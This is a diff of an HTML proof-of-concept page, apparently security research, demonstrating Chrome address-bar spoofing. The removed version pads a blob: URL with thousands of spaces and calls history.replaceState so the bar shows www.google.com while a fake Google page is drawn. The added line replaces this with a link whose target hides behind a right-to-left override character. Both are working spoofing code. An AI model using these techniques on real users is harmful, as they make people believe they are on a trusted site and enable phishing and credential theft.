@@ -1,55 +1,5 @@
-<!DOCTYPE html>
 <html>
-<head>
-<title>Chrome blob: Username Padding URL Spoof</title>
-</head>
 <body>
-
-<h1>Chrome URL Bar Spoofing via blob: + Username Padding</h1>
-<p>CVE Pattern: Chrome 35.0.1916.153 - Username part not collapsed when padded</p>
-
-<button onclick="spoof()">Spoof URL Bar</button>
-<div id="status"></div>
-
-<script>
-function spoof() {
-  // Original vulnerability: blob: + padded username bypasses URL bar collapse
-  // The username part should be hidden but Chrome fails to collapse it when padded
-
-  var targetDomain = "www.google.com";
-  var padding = Array(0x1000).join(" "); // 4096 spaces to prevent collapse
-
-  // Construct spoofed URL: blob:https://www.google.com[padding]@actual-site.com
-  var spoofedURL = "blob:" + location.protocol + "//" + targetDomain + padding + "@" + location.host;
-
-  // Replace URL bar without navigation
-  history.replaceState(null, null, spoofedURL);
-
-  // Render fake Google page
-  document.body.innerHTML = `
-    <div style="text-align:center;padding:100px 20px;font-family:Arial">
-      <h1 style="color:#4285f4;font-size:90px;margin:0">Google</h1>
-      <input type="text" placeholder="Search Google" style="width:500px;padding:12px;margin:20px 0;border:1px solid #ddd;border-radius:24px">
-      <br>
-      <button style="padding:10px 20px;margin:5px">Google Search</button>
-      <button style="padding:10px 20px;margin:5px">I'm Feeling Lucky</button>
-      <p style="margin-top:40px;color:#666">URL bar shows: ${targetDomain}</p>
-      <p style="color:#666">Actual origin: ${location.host}</p>
-    </div>
-  `;
-}
-
-// Auto-execute check
-if (location.protocol === "https:") {
-  document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('status').innerHTML = '<p style="color:green">✓ Running on HTTPS - spoof will work</p>';
-  });
-} else {
-  document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('status').innerHTML = '<p style="color:red">✗ Must run on HTTPS to spoof https:// URLs</p>';
-  });
-}
-</script>
-
+CLICK <a href="‮=refer?moc.elgoog.www//:sptth">HERE</a> TO BE FOOLED
 </body>
 </html>
